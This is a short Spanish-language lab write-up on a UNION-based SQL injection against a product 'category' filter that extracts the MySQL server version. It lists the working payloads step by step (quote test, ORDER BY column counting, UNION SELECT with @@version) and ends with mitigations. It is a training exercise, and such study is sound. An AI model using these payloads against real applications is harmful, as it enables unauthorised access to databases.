Lab 4

SQL Injection attack querying database version on MySQL and Microsoft

Información del laboratorio

Nivel: Practitioner

Tipo de SQLi: UNION-based SQL Injection

Objetivo

Mostrar la versión de la base de datos utilizando un ataque UNION-based SQL Injection.

Vulnerabilidad

El parámetro vulnerable es category dentro del filtro de productos. 

SELECT name, description
FROM products
WHERE category = 'Gifts'

La aplicación concatena directamente el input del usuario sin sanitización ni consultas preparadas.

Procedimiento

Paso 1: Interceptar petición con Burp Suite.

Seleccionamos la categoría Gifts para generar la solicitud vulnerable.

Paso 2: Confirmar vulnerabilidad.

Gifts'

El error SQL confirma que el parámetro es vulnerable.

Paso 3: Determinar número de columnas.

Gifts' ORDER BY 1--
Gifts' ORDER BY 2--
Gifts' ORDER BY 3--

El servidor indica que existen 2 columnas.

Paso 4: Probar UNION.

'+UNION+SELECT+'abc','def'#

La página muestra "abc" y "def", confirmando la inyección.

Paso 5: Extraer versión.

'+UNION+SELECT+@@version,+NULL#

Esto devuelve la versión del servidor: 

8.0.42-0ubuntu0.20.04.1

Corresponde a MySQL 8.0.42 ejecutándose en Ubuntu.

Mitigación recomendada

  • Uso obligatorio de consultas parametrizadas.
  • Principio de mínimo privilegio en la base de datos.
  • Validación estricta del lado del servidor.
  • No mostrar errores SQL.
  • Implementación de WAF.

Severidad estimada: Alta

El atacante puede enumerar el sistema y posteriormente extraer información sensible de la base de datos.
